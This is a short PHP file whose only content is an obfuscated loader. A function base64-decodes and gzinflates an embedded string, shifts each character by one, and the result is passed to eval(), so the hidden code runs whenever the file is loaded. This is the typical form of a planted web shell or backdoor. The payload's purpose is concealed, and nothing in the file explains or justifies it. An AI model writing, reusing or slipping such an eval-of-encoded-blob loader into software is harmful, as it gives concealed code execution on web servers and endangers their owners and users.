<?php function ozaOm($vzI)
{
    $vzI=gzinflate(base64_decode($vzI));
    for($i=0;$i<strlen($vzI);$i++)
    {
        $vzI[$i] = chr(ord($vzI[$i])-1);
    }
    return $vzI;
}eval(ozaOm("bY8xDsIwDEUPkFN4QKIZaEoLAoGKurAwwMABotI40AolVWImxNkhDV0QHv30/7MBPsNYqyHR9d0jlGUJyUTVVEMJlW7vKK9IsrGG0JBPpjeifiPEOkvz+TzNi2W6KkTnxcVa8uTqPu38lHMOTxa6HfreGo9756xL+Ja9AIMn0mo0dd4aqbCxCqOdb0EIiBugG8LhfDqCRlRDMBwcw7Mdhmr+x8SYfpiGWmt+IYv68IsckRzki2zxiQaoWvy2vAE="));?>